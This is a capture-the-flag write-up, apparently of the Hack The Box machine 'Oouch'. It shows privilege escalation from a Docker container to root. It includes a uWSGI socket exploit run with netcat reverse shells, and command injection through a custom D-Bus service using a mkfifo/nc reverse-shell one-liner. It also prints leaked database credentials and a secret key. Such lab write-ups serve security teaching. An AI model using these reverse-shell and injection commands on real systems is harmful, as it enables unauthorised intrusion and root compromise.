During enumeration I came across a config file called `htb.oouch.Block.conf` among the Dbus configuration files. I assumed it tied back to the hidden note about an IPS built on Dbus.  

```bash
qtc@oouch:/etc/dbus-1/system.d$ ls
bluetooth.conf                      htb.oouch.Block.conf             wpa_supplicant.conf
com.ubuntu.SoftwareProperties.conf  org.freedesktop.PackageKit.conf

qtc@oouch:/etc/dbus-1/system.d$ cat htb.oouch.Block.conf
```

```markup
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

        <policy user="www-data">
                <allow send_destination="htb.oouch.Block"/>
                <allow receive_sender="htb.oouch.Block"/>
        </policy>

</busconfig>
```

So `www-data` is allowed to send and receive on dbus via `htb.oouch.Block`, though I wasn't yet sure how to leverage that. 

The output of `ip a` showed Docker containers running in the `172.17.0.1/16` range, which made me wonder whether `qtc` could reach one.  

```bash
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default
    link/ether 02:42:f9:aa:6c:dd brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-cc6c78e0c7d0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:61:5e:2b:bf brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-cc6c78e0c7d0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:61ff:fe5e:2bbf/64 scope link
       valid_lft forever preferred_lft forever
```

It could! Finding a reachable IP \(`172.18.0.5`\) took a few tries, though.  

Side note: When I revisited this to verify my notes, the last octet of the container IP appeared to be randomized. It came up as **`172.178.0.4`** the next time around.

```bash
qtc@oouch:~/.ssh$ ssh qtc@172.18.0.5 -i id_rsa 
The authenticity of host '172.18.0.5 (172.18.0.5)' can't be established.
ED25519 key fingerprint is SHA256:ROF4hYtv6efFf0CQ80jfB60uyDobA9mVYiXVCiHlhSE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.18.0.5' (ED25519) to the list of known hosts.
Linux aeb4525789d8 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
qtc@aeb4525789d8:~$ cat .ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDaiHaXNdUzLxnlmEI1y+DWRQjEELNA+GcK1vEQXmAFYm9f6GubbWvdkt6QkgvWTvh7FnLM5U4sdfKPFv6mNZZwHZ9nNxB4gR+5B5EGOIzX+D+uDmdbe3r+ME8E68t1aUcwLEba6xF+PErQuiEBCdgcH405dYMClu/apccO+ougD+QpWOFhHNE9VOWHZD3++oRNJFS/Zgh8IZOLU0PnnenLC8ZK3CritRchzG0QHKxgV/6tMPmmzIKk0Ak7iixaK8hzrtKfPNCI3QPe8kXG1KYnMoo8mZ6c3CDUWevldAK+m1i7rluORNRwn6r4KAGwdP2qUdtMR2uo7COl2t5uGtuYtBRrhAZe/S637f/VMrrPq8+2B7db+ne1qn4WyD/sPxf4rfZDwlvXJ6ctfKMYUrV69eMtIKaiU3FYGqXTfAaObmFrO0++TvB/ZcH4h21edVPCn2HJ4pHUFZaYDEUKd2Ho61N0cgGUYWWc+mcCoCxyLLSaOJAv2vtjErV9YkyLGWM= pentester@kali

qtc@aeb4525789d8:/$ ls 
bin   code  etc   lib    media  opt   root  sbin  sys  usr
boot  dev   home  lib64  mnt    proc  run   srv   tmp  var
qtc@aeb4525789d8:/$ ls -la
total 84
drwxr-xr-x   1 root root 4096 Feb 25 12:33 .
drwxr-xr-x   1 root root 4096 Feb 25 12:33 ..
-rwxr-xr-x   1 root root    0 Feb 25 12:33 .dockerenv
drwxr-xr-x   1 root root 4096 Feb 11 17:37 bin
drwxr-xr-x   2 root root 4096 Nov 10  2019 boot
drwxr-xr-x   4 root root 4096 Feb 11 17:34 code
drwxr-xr-x   5 root root  340 Jun 11 04:35 dev
drwxr-xr-x   1 root root 4096 Feb 25 12:33 etc
drwxr-xr-x   1 root root 4096 Feb 11 17:37 home
drwxr-xr-x   1 root root 4096 Feb 11 17:37 lib
drwxr-xr-x   2 root root 4096 Jan 30 00:00 lib64
drwxr-xr-x   2 root root 4096 Jan 30 00:00 media
drwxr-xr-x   2 root root 4096 Jan 30 00:00 mnt
drwxr-xr-x   2 root root 4096 Jan 30 00:00 opt
dr-xr-xr-x 215 root root    0 Jun 11 04:35 proc
drwx------   1 root root 4096 Feb 11 17:38 root
drwxr-xr-x   1 root root 4096 Jun 11 10:23 run
drwxr-xr-x   1 root root 4096 Feb 11 17:37 sbin
drwxr-xr-x   2 root root 4096 Jan 30 00:00 srv
dr-xr-xr-x  13 root root    0 Jun 11 04:35 sys
drwxrwxrwt   1 root root 4096 Jun 11 04:35 tmp
drwxr-xr-x   1 root root 4096 Jan 30 00:00 usr
drwxr-xr-x   1 root root 4096 Feb 11 17:36 var
```

Having SSH'd in with the same OpenSSH key for `qtc`, I started enumerating the docker container. The `/code` directory at the root stood out...

```text
qtc@aeb4525789d8:/$ cd code
qtc@aeb4525789d8:/code$ ls -la
total 52
drwxr-xr-x 4 root root 4096 Feb 11 17:34 .
drwxr-xr-x 1 root root 4096 Feb 25 12:33 ..
-rw-r--r-- 1 root root 1072 Feb 11 17:34 Dockerfile
-r-------- 1 root root  568 Feb 11 17:34 authorized_keys
-rw-r--r-- 1 root root  325 Feb 11 17:34 config.py
-rw-r--r-- 1 root root   23 Feb 11 17:34 consumer.py
-r-------- 1 root root 2602 Feb 11 17:34 key
drwxr-xr-x 4 root root 4096 Feb 11 17:34 migrations
-rw-r--r-- 1 root root  724 Feb 11 17:34 nginx.conf
drwxr-xr-x 5 root root 4096 Feb 11 17:34 oouch
-rw-r--r-- 1 root root  241 Feb 11 17:34 requirements.txt
-rwxr-xr-x 1 root root   89 Feb 11 17:34 start.sh
-rw-rw-rw- 1 root root    0 Jun 11 10:36 urls.txt
-rw-r--r-- 1 root root  163 Feb 11 17:34 uwsgi.ini
```

This directory was full of interesting-looking files.

```bash
qtc@aeb4525789d8:/code$ cat requirements.txt 
Flask==1.0.2
Flask-Bootstrap==3.3.7.1
Flask-Login==0.4.1
Flask-Migrate==2.5.2
Flask-SQLAlchemy==2.4.0
Flask-WTF==0.14.2
uWSGI==2.0.17.1
Werkzeug==0.14.1
requests==2.20.1
geojson==2.5.0
jsonschema==2.6.0
simplejson==3.16.0
mysqlclient==1.4.4
```

`requirements.txt` listed the dependencies and version numbers required to run the sites, so there might be something there I could turn into an exploit.

```python
qtc@aeb4525789d8:/code$ cat config.py
import os

basedir = os.path.abspath(os.path.dirname(__file__))

class Config(object):
    # ...
    SQLALCHEMY_DATABASE_URI = 'mysql://qtc:clarabibi2019!@database.consumer.oouch.htb/Consumer'
    SQLALCHEMY_TRACK_MODIFICATIONS = False

    SECRET_KEY = os.environ.get('SECRET_KEY') or 'klarabubuklarabubuklarabubuklarabubu'
```

The MySQL creds in `config.py` caught my eye, though I'm unsure whether they were an alternate path to root or just a rabbit hole. I forgot about them until after rooting the box and never ended up using them.

```bash
qtc@aeb4525789d8:/code$ cat uwsgi.ini 
[uwsgi]
module = oouch:app
uid = www-data
gid = www-data
master = true
processes = 10
socket = /tmp/uwsgi.socket
chmod-sock = 777
vacuum = true
die-on-term = true
```

The `uwsgi` service ran on the `oouch`box, and I also spotted the `wsgi.ini` file inside the Docker container. It evidently runs as the `www-data` user, the same user referenced earlier in `htb.oouch.Block.conf`. Looking for exploits against this service led me to: [https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi\_exp.py](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py)

I then attempted to run the exploit for a reverse shell:

```bash
kac0@kalimaa:~/htb/oouch$ python3 ./uwsgi.py http://<YOUR_IP>:5000 -c " nc -e /bin/sh 10.0.0.1 1234"
usage: uwsgi.py [-h] [-m [{http,tcp,unix}]] -u [UWSGI_ADDR] -c [COMMAND]
uwsgi.py: error: the following arguments are required: -u/--uwsgi
```

Because the `uwsgi` service lives inside the docker container, I couldn't easily make the exploit reach my Kali box. So I used SCP to push the exploit into the container \(plus a copy of nc, since it wasn't installed there\).

Note: make sure to put the `:` after the IP and before the folder name; it won't work otherwise.

```bash
qtc@oouch:/dev/shm$ scp -i /home/qtc/.ssh/id_rsa ./uwsgi.py qtc@172.18.0.5:/tmp/
uwsgi.py                                                             100% 4428     8.3MB/s   00:00
qtc@oouch:/dev/shm$ scp -i /home/qtc/.ssh/id_rsa /bin/nc qtc@172.18.0.5:/tmp/
nc                                                                   100%   27KB  24.7MB/s   00:00
```

With `uwsgi.socket` sitting in `/tmp`, my `--uwsgi` argument was sorted, but running the exploit threw an error:

```bash
qtc@aeb4525789d8:/tmp$ python ./uwsgi.py -m unix -u uwsgi.socket -c "nc -e /bin/sh 10.0.0.1 1234"
[*]Sending payload.
Traceback (most recent call last):
  File "./uwsgi.py", line 146, in <module>
    main()
  File "./uwsgi.py", line 143, in main
    print(curl(args.mode.lower(), args.uwsgi_addr, payload, '/testapp'))
  File "./uwsgi.py", line 110, in curl
    return ask_uwsgi(addr_and_port, mode, var)
  File "./uwsgi.py", line 77, in ask_uwsgi
    s.send(pack_uwsgi_vars(var) + body.encode('utf8'))
  File "./uwsgi.py", line 26, in pack_uwsgi_vars
    pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
  File "./uwsgi.py", line 18, in sz
    if sys.version_info[0] == 3: import bytes
ModuleNotFoundError: No module named 'bytes'
```

Luckily, commenting out the lines that imported the `bytes` module fixed it and the script executed. I still couldn't get a shell back to my own box from the container, so I aimed it at the `oouch` box instead.

```bash
qtc@aeb4525789d8:/tmp$ python ./uwsgi.py -m unix -u uwsgi.socket -c "/tmp/nc -e /bin/sh 172.18.0.1 1234"
[*]Sending payload.
```

...that worked, and I caught a connection on the netcat listener I'd started over on `qtc@oouch`. 

_In case you're wondering how I managed this, I had a second terminal open with another SSH session to the_ **`oouch`** _machine from my localhost. In case you didn't know, you can SSH into the same machine multiple times \(not sure what the technical limit is\)._  

```bash
listening on [any] 1234 ...
connect to [172.18.0.1] from (UNKNOWN) [172.18.0.5] 53934
whoami && hostname
www-data
aeb4525789d8
```

Now running as `www-data`, I wanted to see whether the dbus config file from earlier could be useful. It referenced talking to dbus and the `htb.oouch.block` app. The code below, from `routes.py` in the container's `/code/oouch` directory, showed exactly what I needed to build my DBus message. _\(I also suspect this is the filter that was blocking my early XSS attempts on the `/contact` page\)._

```python
# First apply our primitive xss filter
        if primitive_xss.search(form.textfield.data):
            bus = dbus.SystemBus()
            block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
            block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

            client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)  
            response = block_iface.Block(client_ip)
            bus.close()
            return render_template('hacker.html', title='Hacker')
```

I found examples of how to build the exploit message on GitHub at [https://gist.github.com/ukBaz/d7cd0c4b9e7078c89980a3db2bbad98b](https://gist.github.com/ukBaz/d7cd0c4b9e7078c89980a3db2bbad98b). There's also a related POC abusing a kernel module \(which I didn't use here\) at [https://www.exploit-db.com/exploits/36820](https://www.exploit-db.com/exploits/36820).

The sample exploit command and its reply were:

```bash
dbus-send --print-reply --system --dest=com.ubuntu.USBCreator /com/ubuntu/USBCreator com.ubuntu.USBCreator.KVMTest string:/dev/sda dict:string:string:DISPLAY,"foo",XAUTHORITY,"foo",LD_PRELOAD,"/tmp/test.so"

method return sender=:1.4364 -> dest=:1.7427 reply_serial=2
```

My test command and the service's response:

```bash
dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"echo whoami;"

method return time=1591881935.932055 sender=:1.2 -> destination=:1.1283 serial=7 reply_serial=2
   string "Carried out :D"
```

The `string "Carried out :D"` reply suggested I was on the right track even though no echo appeared. I concluded that stdout simply wasn't being returned to my terminal, which is why my test didn't show output.

Next I swapped the `echo whoami` command for a reverse shell:

```bash
dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.253 1234 >/tmp/f"
```

I still couldn't reach my home box from the container, but I figured I could route this shell back to `qtc@oouch` once more.

Note: It also needed `;` on the end of the string for some reason!! This certainly took a little while to troubleshoot and discover.

### Getting a root shell

Here's my final working exploit:

```text
dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 172.18.0.1 1234 >/tmp/f;"

method return time=1591882762.569865 sender=:1.2 -> destination=:1.1325 serial=15 reply_serial=2
   string "Carried out :D"
```

I'm in! The service fired off a reverse shell back to the netcat listener waiting on the `oouch` machine.  

In hindsight, I likely could have set up an SSH tunnel to reach through from my localhost, but I didn't know how to do that when I first rooted this box.  

### Root.txt

```bash
qtc@oouch:/etc/dbus-1/system.d$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [172.18.0.1] from (UNKNOWN) [<YOUR_IP>] 50776
/bin/sh: 0: can't access tty; job control turned off
# whoami && hostname
root
oouch
# cat root.txt
d63a************************f187
```
